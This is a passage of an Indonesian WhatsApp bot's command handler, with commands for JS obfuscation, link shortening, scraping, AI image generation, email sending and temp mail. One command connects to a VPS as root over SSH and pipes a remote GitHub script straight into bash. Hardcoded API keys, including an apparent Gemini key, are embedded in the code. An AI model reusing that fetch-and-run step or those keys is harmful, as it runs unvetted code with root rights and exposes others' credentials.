    let filename = m.quoted.message.documentMessage.fileName || 'file.js'
    let safeFilename = filename.replace(/[^a-zA-Z0-9_.-]/g, '')
    let tmpPath = `./@hardenc-${safeFilename}`

    fs.writeFileSync(tmpPath, media)
    m.reply("Memproses encrypt hard code . . .")

    JsConfuser.obfuscate(fs.readFileSync(tmpPath).toString(), {
        target: "node",
        preset: "high",
        compact: true,
        minify: true,
        flatten: true,
        identifierGenerator: function() {
            const originalString = "/*BiyuOffc/*^/*($break)*/" + "/*BiyuOffc/*^/*($break)*/"
            function hapusKarakterTidakDiinginkan(input) {
                return input.replace(/[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, '')
            }
            function stringAcak(panjang) {
                let hasil = ''
                const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
                for (let i = 0; i < panjang; i++) {
                    hasil += karakter.charAt(Math.floor(Math.random() * karakter.length))
                }
                return hasil
            }
            return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2)
        },
        renameVariables: true,
        renameGlobals: true,
        stringEncoding: 0.01,
        stringSplitting: 0.1,
        stringConcealing: true,
        stringCompression: true,
        duplicateLiteralsRemoval: true,
        shuffle: {
            hash: false,
            true: false
        },
        stack: false,
        controlFlowFlattening: false,
        opaquePredicates: false,
        deadCode: false,
        dispatcher: false,
        rgf: false,
        calculator: false,
        hexadecimalNumbers: false,
        movedDeclarations: true,
        objectExtraction: true,
        globalConcealing: true
    }).then(async (obfuscated) => {
        fs.writeFileSync(tmpPath, obfuscated)
        await conn.sendMessage(m.chat, {
            document: fs.readFileSync(tmpPath),
            mimetype: "application/javascript",
            fileName: filename,
            caption: "Encrypt File JS Sukses! Type:\nString"
        }, { quoted: m })
        fs.unlinkSync(tmpPath)
    }).catch(e => {
        m.reply("Error :" + e)
        fs.unlinkSync(tmpPath)
    })
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shortlink": case "shorturl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return m.reply(link)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "shortlink-dl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await conn.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "idgc":
case "cekidgc": {
    let idgc
    const regex = /chat\.whatsapp\.com\/([0-9A-Za-z]+)/i
    let code = q.match(regex)?.[1]
    if (code) {
        try {
            let res = await conn.groupGetInviteInfo(code)
            idgc = res.id
        } catch (e) {
            return Reply("Gagal ambil ID dari link. Link-nya valid nggak? Atau bot diblokir dari grup itu?")
        }
    } else {
        idgc = m.chat
    }
    m.reply(`${idgc}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listgc": case "listgrup": {
if (!isCreator) return
let teks = `\n *乂 List all group chat*\n`
let a = await conn.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break

case 'ailuminai': case 'luminai': case '+': {
    if (!text) return m.reply(`Halo 🖐 Saya Adalah Luminai ai apakah ada yang ingin ditanyakan ?`);

    conn.sendMessage(m.chat, { react: { text: `⌛`, key: m.key }})
    try {
        let url = `https://www.archive-ui.biz.id/ai/luminai?text=${encodeURIComponent(text)}`;
        let res = await fetch(url);
        if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);

        let json = await res.json();

        if (!json.status) {
            return m.reply(`❌ Gagal. status: ${json.status}\nCreator: ${json.creator || 'Tidak diketahui.'}`);
        }


        let aiResponse = json.result;
        if (!aiResponse) {
            return m.reply("❌ Tidak ada respons AI yang ditemukan.");
        }


        m.reply(aiResponse);

    } catch (err) {
        console.error("Error ailuminai:", err);
        m.reply("❌ Terjadi kesalahan saat memproses permintaan AI.");
    }
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'beritaanime': {
 const axios = require("axios")
 const cheerio = require("cheerio")

 async function animeNews() {
 try {
 const anu = await axios.get("https://www.kaorinusantara.or.id/rubrik/aktual/anime")
 const $ = cheerio.load(anu.data)
 const dbres = []

 $(".td_module_10.td_module_wrap.td-animation-stack").each((a, b) => {
 const judul = $(b).find("h3").text()
 const link = $(b).find("h3 a").attr("href")
 dbres.push({ judul, link })
 })

 return dbres
 } catch (err) {
 console.log(err)
 }
 }

 const apa = await animeNews()
 m.reply("BERITA ANIME TERBARU\n\n" + apa.map(aww => `JUDUL: ${aww.judul}\nLINK: ${aww.link}`).join("\n\n"))
}
 break
 
 case 'kisahnabi': {
if (!text) return m.reply(`Masukan nama nabi\nExample: kisahnabi adam`)
let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
let kisah = await url.json().catch(_ => "Error")
if (kisah == "Error") return m.reply("*Not Found*")

let hasil = `*👳 Nabi :* ${kisah.name}
*- Tanggal Lahir :* ${kisah.thn_kelahiran}
*- Tempat Lahir :* ${kisah.tmp}
*- Usia :* ${kisah.usia}

*—————— \`[ K I S A H ]\` ——————*

${kisah.description}`

m.reply(`${hasil}`)

}
break
case 'avos': {
 let validEffects = [
 "sweetheart", "flutter", "pinkglow", "volcano", "petalprint", "giftwrap", "mrfrosty", "littlehelper",
 "sprinklesparkle", "seasonsgreetings", "heartbeat", "valentine", "sapphireheart", "signature", "lollipop",
 "handbag", "tiptoe", "sketchy", "ghostship", "oldenglish", "dragonscale", "magicdust", "substance",
 "piratescove", "backstreet", "funkyzeit", "airman", "foolsgold", "zephyr", "paintbrush", "lokum", "insignia",
 "cottoncandy", "fairygarden", "neonlights", "glowstick", "lavender", "ohhai", "bluegecko", "moderno",
 "petalprint", "rhizome", "devana", "cupcake", "fame", "ionize", "volcano", "broadway", "sweetheart",
 "starshine", "flowerpower", "gobstopper", "discodiva", "medieval", "fruityfresh", "letterboard",
 "greenstone", "alieninvasion", "pinkglow", "pinkcandy", "losttales", "glowtxt", "purple", "yourstruly",
 "electricblue", "greek", "cyrillic", "cyrillic2", "cyrillic3", "korean", "arabic", "arabic2", "arabic3",
 "hindi", "chinese", "japanese", "hebrew", "hebrew2", "hebrew3", "ethiopic", "ethiopic2", "ethiopic3",
 "vietnamese", "icelandic", "bengali", "yoruba", "igbo", "armenian", "armenian2", "georgian", "georgian2",
 "thai", "euro", "euro2", "euro3", "allstars", "dearest", "metropol", "ransom", "bronco", "platformtwo",
 "fictional", "typeface", "stardate", "beachfront", "arthouse", "sterling", "jukebox", "bubbles",
 "invitation", "frontier", "surprise", "firstedition", "republika", "jumble", "warehouse", "orientexpress",
 "orbitron", "starlight", "jet", "tamil", "kannada", "telugu", "punjabi", "malayalam", "odia", "thai2",
 "thai3", "thai4", "hindi2", "hindi3", "hindi4", "hindi5", "hindi6", "hindi7", "hindi8", "euro4",
 "arabic4", "arabic5", "arabic6", "hebrew4", "hebrew5", "hebrew6", "cyrillic4", "japanese2", "japanese3",
 "japanese4", "japanese5", "japanese6", "japanese7", "japanese8", "japanese9", "japanese10", "japanese11",
 "japanese12", "japanese13", "chinese_tc"
 ];

 if (!q.includes(',')) return m.reply(
 `*Format salah!*\n` +
 `Gunakan: *avos teks,effect*\n` +
 `Contoh: *avos Halo,sweetheart*\n\n` +
 `*List effect tersedia:*\n${validEffects.map((v, i) => `${i + 1}. ${v}`).join('\n')}`
 );
 let [text, effect] = q.split(',');
 text = text.trim();
 effect = effect.trim().toLowerCase();
 if (!text || !effect) return m.reply(
 `*Format salah!* Pastikan teks dan effect tidak kosong.\n\n` +
 `*List effect tersedia:*\n${validEffects.map((v, i) => `${i + 1}. ${v}`).join('\n')}`
 );
 if (!validEffects.includes(effect)) {
 return m.reply(
 `*Effect tidak valid!*\nGunakan salah satu dari daftar berikut:\n\n` +
 `${validEffects.map((v, i) => `${i + 1}. ${v}`).join('\n')}`
 );
 }
 let apiUrl = `https://api.crafters.biz.id/maker/avos?text=${encodeURIComponent(text)}&effect=${encodeURIComponent(effect)}`;
 conn.sendMessage(m.chat, { text: 'Sedang diproses...' });
 try {
 let res = await fetch(apiUrl);
 let json = await res.json();
 if (json.status && json.result?.url) {
 conn.sendMessage(m.chat, { 
 image: { url: json.result.url }, 
 caption: `✅ *Berhasil!*\nEffect: *${effect}*` 
 }, { quoted: m });
 } else {
 m.reply('❌ Gagal membuat teks avos. Coba lagi nanti!');
 }
 } catch (e) {
 console.error(e);
 m.reply('⚠️ Terjadi kesalahan dalam mengambil data.');
 }
}
break

case "installdepend": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
 
const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses installdepend pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => { 
await m.reply("Berhasil install Depend silakan ketik .installtemanebula ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('11\n');
stream.write('A\n');
stream.write('Y\n');
stream.write('Y\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case 'aigen':
case 'aiimage': {
 if (!text) return m.reply(`🚨 Masukkan prompt gambar!\n\nContoh: .aigen anime girl with blue hair`);
 m.reply("🎨 Generating AI Image...");
 try {
 const axios = require("axios");
 async function generateImage(prompt) {
 const url = `https://1yjs1yldj7.execute-api.us-east-1.amazonaws.com/default/ai_image?prompt=${encodeURIComponent(prompt)}&aspect_ratio=1:1&link=writecream.com`;
 const headers = {
 "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
 "Referer": "https://www.writecream.com/ai-image-generator-free-no-sign-up/"
 };
 let { data } = await axios.get(url, { headers });
 if (data && data.image_link) return { success: true, imageUrl: data.image_link };
 return { success: false, message: "❌ Gagal mendapatkan gambar!" };
 }
 let result = await generateImage(text);
 if (!result.success) return m.reply(result.message);
 await conn.sendMessage(m.chat, { react: { text: '🎨', key: m.key } });
 await conn.sendMessage(m.chat, { 
 image: { url: result.imageUrl }, 
 caption: `🖼️ *AI Image Generator*\n\n🎨 *Prompt:* ${text}` 
 }, { quoted: m });
 m.reply("✅ Gambar berhasil dibuat!");
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat gambar!");
 }
}
break
case 'font': case 'text': {
  if (!q) return m.reply(`Inputnya mana? Kalo niat nyari font mah minimal input nama fontnya anjir 🗿\n\nKetik ${prefix}listfont [untuk melihat liat font yang tersedia]`);

  const fontx = /^[a-zA-Z0-9\s-]+$/;
  const fn = q.trim();
  if (!fontx.test(fn)) return m.reply(`Format nama font lu salah bree.. Pake huruf, angka, spasi atau strip aja yak kalo kagak tau mah :v, kalau mau liat list font ketk ${prefix}listfont`);

  try {
    const axios = require('axios');
    const { data } = await axios.get('https://fontasy.co/api/google/webfonts', {
      headers: {
        'accept': 'application/json',
        'user-agent': 'Postify/1.0.0'
      }
    });
    if (!data || !data.items) return m.reply("Udah sih, capek banget... Gagal ngambil data fontnya euy 🗿");

    const hasil = data.items.filter(font => font.family.toLowerCase().includes(fn.toLowerCase()) || font.category.toLowerCase().includes(fn.toLowerCase())
    );
    if (!hasil.length) return m.reply("Waduh fontnya kagak ketemu nih bree.. 🥴");
    let teks = `*Hasil Pencarian Font: ${fn}*\n\n`;
    for (let i = 0; i < hasil.length; i++) {
      const font = hasil[i];
      teks += `*${i + 1}. ${font.family}*\n`;
      teks += `• Kategori: ${font.category}\n`;
      teks += `• Versi: ${font.version}\n`;
      teks += `• Terakhir Update: ${font.lastModified}\n`;
      teks += `• Subset: ${font.subsets.join(', ')}\n`;
      teks += `• Variants: ${font.variants.join(', ')}\n`;

      const fileUrls = Object.values(font.files);
      if (fileUrls.length) {
        teks += `• Download: ${fileUrls[0]}\n\n`;
        const fontBuffer = await axios.get(fileUrls[0], { responseType: 'arraybuffer' });
        await conn.sendMessage(m.chat, {
          document: Buffer.from(fontBuffer.data),
          fileName: `${font.family}.ttf`,
          mimetype: 'font/ttf'
        }, { quoted: m });
      } else {
        teks += `\n`;
      }
    }
    m.reply(teks);
  } catch (err) {
    console.error(err);
    m.reply("Yah error bree.. Coba lagi dah 🗿");
  }
}
break
case 'listfont': case 'listfonts': case 'listtext': {
  try {
    const axios = require('axios');
    const { data } = await axios.get('https://fontasy.co/api/google/webfonts', {
      headers: {
        'accept': 'application/json',
        'user-agent': 'Postify/1.0.0'
      }
    });
    if (!data || !data.items) return m.reply("Gagal ambil list font bree..");
    let teks = `*Daftar Google Fonts Tersedia*\nTotal: ${data.items.length} fonts\n\n`;
    data.items.forEach((font, i) => {
      teks += `*${i + 1}. ${font.family}*\n`;
    });

    teks += `\nMau cari font tertentu? Ketik:\n*font nama-font*\nContoh: *${prefix}font Inria Sans*`;
    if (teks.length > 3000) {
      const { writeFileSync } = require('fs');
      const path = require('path');
      const filePath = path.join(__dirname, 'listfont.txt');
      writeFileSync(filePath, teks);
      await conn.sendMessage(m.chat, {
        document: { url: filePath },
        fileName: 'List_Font_Google.txt',
        mimetype: 'text/plain'
      }, { quoted: m });
    } else {
      m.reply(teks);
    }
  } catch (err) {
    console.error(err);
    m.reply("Waduh error pas ambil list fontnya..");
  }
}
break
case 'gptonline': {
  if (!text) return m.reply('Contoh: gptonline halo apa kabar?')

  try {
const axios = require('axios');
const cheerio = require('cheerio');
    const { data } = await axios.get("https://gptonline.ai/id/chatgpt-online/")
    const $ = cheerio.load(data)
    const div = $('.wpaicg-chat-shortcode')
    const nonce = div.attr('data-nonce')
    const botId = div.attr('data-bot-id')
    const postId = div.attr('data-post-id')
    let form = new FormData()
    form.append("_wpnonce", nonce)
    form.append("post_id", postId)
    form.append("url", "https://gptonline.ai/id/chatgpt-online/")
    form.append("action", "wpaicg_chat_shortcode_message")
    form.append("message", text)
    form.append("bot_id", botId)
    form.append("chat_bot_identity", "custom_bot_1040")
    form.append("wpaicg_chat_history", "[]")
    form.append("wpaicg_chat_client_id", "LCgGOMeIOC")
    const res = await axios.post( "https://gptonline.ai/id/wp-admin/admin-ajax.php",
      form,
      { headers: form.getHeaders() }
    )
    let hasil = res.data?.data?.message || res.data?.data || 'Gagal mendapatkan respon.'
    m.reply(hasil)
  } catch (e) {
    console.log(e)
    m.reply('Terjadi error, coba lagi nanti.')
  }
}
  break
case 'aitohuman': {
 if (!text) return conn.sendMessage(m.chat, { text: 'Masukkan teks yang ingin dikonversi!' }, { quoted: m });

 async function convertAiToHumanStream(discussiontopic, options = {}) {
 const params = {
 wpaicg_stream: 'yes',
 discussiontopic: encodeURIComponent(discussiontopic),
 engine: options.engine || 'gpt-4o-mini',
 max_tokens: options.max_tokens || 1000,
 temperature: options.temperature || 0.7,
 top_p: options.top_p || 1,
 best_of: options.best_of || 1,
 frequency_penalty: options.frequency_penalty || 0,
 presence_penalty: options.presence_penalty || 0,
 stop: options.stop || '',
 post_title: options.post_title || 'AI to Human Text Converter (Normal)',
 id: options.id || '1654',
 source_stream: options.source_stream || 'form',
 nonce: options.nonce || 'f03c73b6b9'
 };
 const headers = {
 'authority': 'aitohuman.org',
 'accept': 'text/event-stream',
 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
 'cache-control': 'no-cache',
 'pragma': 'no-cache',
 'referer': 'https://aitohuman.org/ai-to-human-text-converter-ai/',
 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36'
 };
 try {
const axios = require('axios');
 const response = await axios({
 method: 'get',
 url: 'https://aitohuman.org/index.php',
 params: params,
 headers: headers,
 responseType: 'stream'
 });
 return response.data;
 } catch (error) {
 throw new Error(`Gagal melakukan request: ${error.message}`);
 }
 }
 async function processText(m, text) {
 try {
 const stream = await convertAiToHumanStream(text);
 let fullResponse = '';
 stream.on('data', (chunk) => {
 const chunkStr = chunk.toString();
 const lines = chunkStr.split('\n');
 for (const line of lines) {
 if (line.startsWith('data: ')) {
 const data = line.substring(6).trim();
 if (data === '[DONE]') return;
 try {
 const parsed = JSON.parse(data);
 if (parsed.choices && parsed.choices[0].delta?.content) {
 fullResponse += parsed.choices[0].delta.content;
 }
 } catch (e) {}
 }
 }
 });
 stream.on('end', () => {
 conn.sendMessage(m.chat, { text: fullResponse }, { quoted: m });
 });
 stream.on('error', (err) => {
 conn.sendMessage(m.chat, { text: `Error dalam stream: ${err.message}` }, { quoted: m });
 });
 } catch (error) {
 conn.sendMessage(m.chat, { text: `Error: ${error.message}` }, { quoted: m });
 }
 }
 processText(m, text);
}
 break
case 'lemonmail': case 'sendemail': {
 const argsxx = text.split('|'); if (argsbiyuoffc.length < 3) return m.reply('Format salah! Gunakan: email|subject|pesan');
const [target, subject, message] = argsxx;
        m.reply('Mengirim email...');
        try {
            const data = JSON.stringify({ "to": target.trim(), "subject": subject.trim(), "message": message.trim() });
            const config = {
                method: 'POST',
                url: 'https://lemon-email.vercel.app/send-email',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
                    'Content-Type': 'application/json',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
                    'sec-ch-ua-mobile': '?1',
                    'origin': 'https://lemon-email.vercel.app',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://lemon-email.vercel.app/',
                    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                    'priority': 'u=1, i'
                },
                data: data
            };
            const axios = require('axios');
            const api = await axios.request(config);
            m.reply(`Hasil: ${JSON.stringify(api.data, null, 2)}`);
        } catch (error) {
            m.reply(`Error: ${error.message}`);
        }
        }
        break
        
        case 'tempmail': {
 class TempMail {
 constructor() {
 this.cookie = null;
 this.baseUrl = 'https://tempmail.so';
 }

 async updateCookie(response) {
 if (response.headers['set-cookie']) {
 this.cookie = response.headers['set-cookie'].join('; ');
 }
 }

 async makeRequest(url) {
const axios = require('axios');
 const response = await axios({
 method: 'GET',
 url: url,
 headers: {
 'accept': 'application/json',
 'cookie': this.cookie || '',
 'referer': this.baseUrl + '/',
 'x-inbox-lifespan': '600',
 'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 'sec-ch-ua-mobile': '?1'
 }
 });

 await this.updateCookie(response);
 return response;
 }

 async initialize() {
const axios = require('axios');
 const response = await axios.get(this.baseUrl, {
 headers: {
 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
 'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"'
 }
 });
 await this.updateCookie(response);
 return this;
 }

 async getInbox() {
 const url = `${this.baseUrl}/us/api/inbox?requestTime=${Date.now()}&lang=us`;
 const response = await this.makeRequest(url);
 return response.data;
 }

 async getMessage(messageId) {
 const url = `${this.baseUrl}/us/api/inbox/messagehtmlbody/${messageId}?requestTime=${Date.now()}&lang=us`;
 const response = await this.makeRequest(url);
 return response.data;
 }
 }

 try {
 const mail = new TempMail();
 await mail.initialize();

 const inbox = await mail.getInbox();

 if (!inbox.data?.name) {
 throw new Error('Failed to get temporary email');
 }

 const emailInfo = `Temporary Email\n\n*Email :* ${inbox.data.name}\n *Expired :* 10 minutes\nInbox Status : ${inbox.data.inbox?.length || 0} Pesan\n\n> Email Akan Otomatis Dihapus Setelah 10 Menit`;
 await m.reply(emailInfo);

 const state = {
 processedMessages: new Set(),
 lastCheck: Date.now(),
 isRunning: true
 };

 const processInbox = async () => {
 if (!state.isRunning) return;

 try {
 const updatedInbox = await mail.getInbox();

 if (updatedInbox.data?.inbox?.length > 0) {
 const sortedMessages = [...updatedInbox.data.inbox].sort((a, b) =>
 new Date(b.date) - new Date(a.date));

 for (const message of sortedMessages) {
 if (!state.processedMessages.has(message.id)) {
 const messageDetail = await mail.getMessage(message.id);

 let cleanContent = messageDetail.data?.html
 ? messageDetail.data.html.replace(/<[^>]*>?/gm, '').trim()
 : 'No text content';

 const messageInfo = `_Ada Pesan Baru Nih_\n\nFrom : ${message.from || 'Anomali'}\n*Subject :* ${message.subject || 'No Subject'}\n\n*Pesan :*\n${cleanContent}`;

 await conn.sendMessage(m.chat, { text: messageInfo }, { quoted: m });
 state.processedMessages.add(message.id);
 }
 }
 }
 } catch (error) {
 console.error('Error:', error);
 }
 };

 await processInbox();

 const checkInterval = setInterval(processInbox, 10000);

 setTimeout(() => {
 state.isRunning = false;
 clearInterval(checkInterval);
 m.reply('Email Otomatis Di Hapus Setelah 10 Menit');
 }, 600000);

 } catch (error) {
 m.reply(`Error: ${error.message}`);
 }
}
 break
case 'wgp': case 'searchgb': case 'whatsappgrouplink': case 'searchgc':
const axios = require('axios');
const cheerio = require('cheerio');

const WGL = {
    async search(q) {
        const {
            data
        } = await axios.get('https://whatsgrouplink.com/?s=' + q);
        const $ = cheerio.load(data);
        const items = [];

        $('article').each((index, element) => {
            const image = $(element).find('img').attr('src');
            const date = $(element).find('time').text().trim();
            const title = $(element).find('.entry-title-link').text().trim();
            const link = $(element).find('a').attr('href');
            items.push({
                image,
                date,
                title,
                link
            });
        });

        return items;
    },

    async detail(q) {
        const {
            data
        } = await axios.get(q);
        const $ = cheerio.load(data);
        const items = {};
        const str = $('.entry-content').html();

        let aha = str.split('<div style="margin-top: 0px; margin-bottom: 0px;" class="sharethis-inline-share-buttons"></div>')[1];
        items.desc = cheerio.load(aha.split('<h3')[0]).text().replace(/\n+/g, '\n').trim();

        let anu = ['rules', 'links', 'how', 'related'];
        $('.entry-content ul').each((i, e) => {
            let iye = [];
            $(e).find('li').each((j, d) => {
                if (i % 2 === 0) {
                    iye.push($(d).text());
                } else {
                    let blox = {};
                    blox.title = $(d).text().split('–')[0].trim();
                    blox.link = $(d).find('a').attr('href');
                    iye.push(blox);
                }
            });
            items[anu[i]] = iye;
        });

        return items;
    }
};

let subcmd = argsbiyuoffc[0];

if (!subcmd) {
    return conn.sendMessage(from, {
        text: "Gunakan *wgp search katakunci* atau *wgp detail URL*\n\nExample:\nwgp search anime\nwgp detail https://whatsgrouplink.com/pixar-whatsapp-group-links/"
    }, {
        quoted: m
    });
}

if (subcmd === 'search') {
    let query = argsbiyuoffc.slice(1).join(" ");
    if (!query) {
        return conn.sendMessage(from, {
            text: "Masukkan kata kunci untuk pencarian."
        }, {
            quoted: m
        });
    }

    let hasil = await WGL.search(query);
    if (!hasil || hasil.length === 0) {
        return conn.sendMessage(from, {
            text: "Tidak Menemukan Hasilnya."
        }, {
            quoted: m
        });
    }

    let psan = "🔍 *Hasil Pencarian:*\n\n";
    hasil.forEach((item, index) => {
        psan += `${index + 1}. ${item.title}\n  ${item.link}\n\n`;
    });

    conn.sendMessage(from, {
        text: psan
    }, {
        quoted: m
    });

} else if (subcmd === 'detail') {
    let url = argsbiyuoffc[1];
    if (!url) {
        return conn.sendMessage(from, {
            text: "Masukkan URL untuk detail grup."
        }, {
            quoted: m
        });
    }

    let ditel = await WGL.detail(url);
    if (!ditel) {
        return conn.sendMessage(from, {
            text: "Gagal mengambil detail grup."
        }, {
            quoted: m
        });
    }

    let psan = `🎬 *Detail Grup:*\n\n`;
    psan += `🔸 *Deskripsi*: ${ditel.desc}\n\n`;

    ['rules', 'links', 'how', 'related'].forEach((section) => {
        if (ditel[section] && ditel[section].length) {
            psan += `🔸 *${section.charAt(0).toUpperCase() + section.slice(1)}*:\n`;
            ditel[section].forEach(item => {
                psan += `- ${item.title || item}\n  ${item.link || ''}\n`;
            });
        }
    });

    conn.sendMessage(from, {
        text: psan
    }, {
        quoted: m
    });

} else {
    conn.sendMessage(from, {
        text: "Gunakan *wgp search katakunci* atau *wgp detail URL*\n\nExample:\nwgp search anime\nwgp detail https://whatsgrouplink.com/pixar-whatsapp-group-links/"
    }, {
        quoted: m
    });
}
break

case 'hijabkan': case 'tohijab': {
    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || "";
    let defaultPrompt = "Buatkan Karakter Yang Ada Di Gambar Tersebut Agar Diberikan Hijab Warna Putih Hijab Ala Orang Indonesia Dan Jangan Sampai Rambutnya Terlihat, Semua Tertutup";
    if (!mime) {
        m.reply("Tidak ada gambar yang direply, membuat gambar default...");
        mime = "image/png";
        q = { msg: { mimetype: mime }, download: async () => fs.readFileSync("default_image.png") };
    }
    if (!/image\/(jpe?g|png)/.test(mime)) return m.reply(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png`);
    let promptText = text || defaultPrompt;
    m.reply("Otw Di Hijabkan...");
    try {
        let imgData = await q.download();
        let genAI = new GoogleGenerativeAI("AIzaSyB8T-3WnKqDbK3GSYYUtTiyDfIV-vBxoPw");
        const base64Image = imgData.toString("base64");
        const contents = [
            { text: promptText },
            {
                inlineData: {
                    mimeType: mime,
                    data: base64Image
                }
            }
        ];
        const model = genAI.getGenerativeModel({
            model: "gemini-2.0-flash-exp-image-generation",
            generationConfig: {
                responseModalities: ["Text", "Image"]
            },
        });
        const response = await model.generateContent(contents);
        let resultImage;
        let resultText = "";
        for (const part of response.response.candidates[0].content.parts) {
            if (part.text) {
                resultText += part.text;
            } else if (part.inlineData) {
                const imageData = part.inlineData.data;
                resultImage = Buffer.from(imageData, "base64");
            }
        }
        if (resultImage) {
            const tmpDir = path.join(process.cwd(), "tmp");
            if (!fs.existsSync(tmpDir)) {
                fs.mkdirSync(tmpDir, { recursive: true });
            }
            let tempPath = path.join(tmpDir, `gemini_${Date.now()}.png`);
            fs.writeFileSync(tempPath, resultImage);
            await conn.sendMessage(m.chat, { 
                image: { url: tempPath },
                caption: `*Waifu Halal Halal*`
            }, { quoted: m });
            setTimeout(() => {
                try {
                    fs.unlinkSync(tempPath);
                } catch (err) {
                    console.error("Failed to delete temp file:", err);
                }
            }, 30000);
        } else {
            m.reply("Gagal Di Hijabkan Dosa Nya Ke gedean Ini Mah.");
        }
    } catch (error) {
        console.error(error);
        m.reply(`Error: ${error.message}`);
    }
}
break
case 'inspect': case 'infogb': {
  if (!text) return m.reply('Masukkan Link Group!')
  let _grup = /chat.whatsapp.com\/([\w\d]*)/
  let _saluran = /whatsapp\.com\/channel\/([\w\d]*)/
  if (_grup.test(text)) {
    await conn.groupGetInviteInfo(text.match(_grup)[1]).then((_g) => {
      let teks = `*[ INFORMATION GROUP ]*\n\nName Group: ${_g.subject}\nGroup ID: ${_g.id}\nCreate At: ${new Date(_g.creation * 1000).toLocaleString()}${_g.owner ? ('\nCreate By: ' + _g.owner) : '' }\nLinked Parent: ${_g.linkedParent}\nRestrict: ${_g.restrict}\nAnnounce: ${_g.announce}\nIs Community: ${_g.isCommunity}\nCommunity Announce:${_g.isCommunityAnnounce}\nJoin Approval: ${_g.joinApprovalMode}\nMember Add Mode: ${_g.memberAddMode}\nDescription ID: ${'`' + _g.descId + '`'}\nDescription: ${_g.desc}\n\nParticipants:\n`
      _g.participants.forEach((a) => {
        teks += a.admin ? `- Admin: @${a.id.split('@')[0]} [${a.admin}]\n` : ''
      })
      m.reply(teks)
    }).catch((e) => {
      if ([400, 406].includes(e.data)) return m.reply('Grup Tidak Di Temukan❗')
      if (e.data == 401) return m.reply('Bot Di Kick Dari Grup Tersebut❗')
      if (e.data == 410) return m.reply('Url Grup Telah Di Setel Ulang❗')
    })
  } else if (_saluran.test(text) || text.endsWith('@newsletter') || !isNaN(text)) {
    await conn.groupMetadata(text).then((n) => {
      m.reply(`*[ INFORMATION CHANNEL ]*\n\nID: ${n.id}\nName: ${n.subject}\nCreate At: ${new Date(n.creation * 1000).toLocaleString()}\nParticipants: ${n.participants.length}\nDescription: ${n.desc}\n`)
    }).catch((e) => m.reply('Saluran Tidak Di Temukan❗'))
  } else {
    m.reply('Hanya Support Url Grup atau Saluran!')
  }
} break
case 'myanimelist': {
  if (!q) return m.reply('Contoh: myanimelist one piece')
  let anime = await fetch(`https://api.jikan.moe/v4/anime?q=${q}`)
  let res = await anime.json()
  if (!res.data || res.data.length === 0) return m.reply('Anime tidak ditemukan!')
  let result = res.data[0]
  let teks = `*${result.title}*\n\n`
